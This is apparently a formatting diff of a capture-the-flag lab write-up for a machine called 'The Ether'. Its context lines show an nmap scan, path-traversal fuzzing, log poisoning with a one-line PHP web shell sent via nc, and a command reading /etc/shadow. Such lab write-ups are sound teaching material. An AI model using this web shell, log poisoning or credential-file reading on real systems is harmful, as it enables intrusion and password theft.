@@ -21,8 +21,7 @@ Let's kick this off with a `nmap` scan to establish the services available in **
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
-```
-```
+...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -44,8 +43,6 @@ Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I ca
 
 ```
 # curl -s 192.168.198.130 | grep -Eo '(src\=\".*\"|href\=\".*\")' | cut -d'"' -f2
-```
-```
 http://www.os-templates.com/
 layout/styles/layout.css
 index.php
@@ -153,8 +150,6 @@ Now, let's give `fuzz.sh` a shot.
 
 ```
 # ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
-```
-```
 ...
 [+] Trying ../pub/about.php
 [+] Trying ../public/about.php
@@ -193,8 +188,6 @@ Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
 # ./brute.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
-```
-```
 ...
 [+] Trying ../../theeTHER.CoM/public_html/about.php
 [+] Trying ../../theeTHER.COm/public_html/about.php
@@ -218,8 +211,6 @@ Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this l
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
-```
-```
 ...
 [+] Trying /var/www/html/theEther.com/log.sqlite
 [+] Trying /var/www/html/theEther.com/log.txt
@@ -235,8 +226,6 @@ Now that I've found `access.log`, I can corrupt it by sending PHP code through `
 
 ```
 # nc 192.168.198.130 80
-```
-```
 <pre><?php echo shell_exec($_GET['cmd']);?></pre>
 HTTP/1.1 400 Bad Request
 Date: Thu, 08 Feb 2018 20:22:21 GMT
@@ -414,7 +403,7 @@ Holy smoke. It worked!
 
 My guess is that the command ran like this.
 
-```
+```shell
 cat /var/log/auth.log /etc/shadow
 ```
 
